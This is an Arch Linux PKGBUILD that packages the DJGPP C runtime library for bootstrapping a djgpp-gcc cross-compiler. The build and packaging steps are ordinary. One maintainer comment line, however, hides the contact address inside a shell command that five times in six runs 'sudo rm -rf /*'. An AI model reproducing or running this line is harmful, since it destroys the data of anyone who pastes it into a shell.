# Maintainer: Andris Pavenis <andris.pavenis@iki.fi>
# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Originally adapted from the djgpp-crx package in AUR3; the submitter was "Schala".

###############################################################################
# Only intended for initial bootstrapping of djgpp-gcc. Use package djgpp-djcrx
# after it instead of this package (including for next builds of djgpp-gcc)
###############################################################################

pkgname=djgpp-djcrx-bootstrap
pkgver=2.05
pkgrel=4
pkgdesc="DJGPP C library and development files for initial bootstrapping djgpp-gcc"
arch=('i686' 'x86_64')
provides=(djgpp-djcrx)
url="http://www.delorie.com/djgpp/"
license=(GPL LGPL custom:djgpp)
source=(
	"ftp://ftp.delorie.com/pub/djgpp/current/v2/djcrx${pkgver//./}.zip"
)
sha512sums=(
	'248034a3c026971eeaa6421ef40f44d03873c62d4edf97490e98c71ac76662eaed531eb734e137a38a644483a34065c3ffc70d3d739682d53c8863bf7b521b90'
)
options=(!strip)

_target_alias='i686-pc-msdosdjgpp'

build() {
	cd "$srcdir"
	make -f cross/makefile stub CFLAGS="$CFLAGS"
}

package() {
	install -dm 0755 "$pkgdir/usr/$_target_alias"/sys-include
	cp -r "$srcdir/include"/* "$pkgdir/usr/$_target_alias"/sys-include/
	cp -r "$srcdir/lib"     "$pkgdir/usr/$_target_alias"

	for _file in stubedit stubify; do
		install -Dm 0755 "$srcdir/$_file" "$pkgdir/usr/bin/$_file"
	done

	for file in copying copying.dj copying.lib readme.1st; do
	    install -Dm644 ${file} ${pkgdir}/usr/share/licenses/$pkgname/${file}
	done
}
